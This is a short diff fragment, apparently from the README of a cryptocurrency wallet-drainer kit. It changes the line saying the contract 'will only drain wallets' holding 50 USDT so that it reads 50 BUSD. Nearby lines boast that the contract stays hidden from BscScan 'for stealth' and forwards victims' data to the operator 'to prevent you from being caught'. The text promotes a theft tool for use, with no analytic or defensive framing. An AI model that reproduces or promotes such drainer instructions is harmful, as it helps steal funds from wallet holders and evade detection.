@@ -25,7 +25,7 @@ Smart contract address will show up in the approve and other buttons not yours f
 
 !!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!
 
-THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 USDT or more for stealth
+THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 BUSD or more for stealth
 
 1. the smart contract will foward the data to you to prevent you from being caught
 
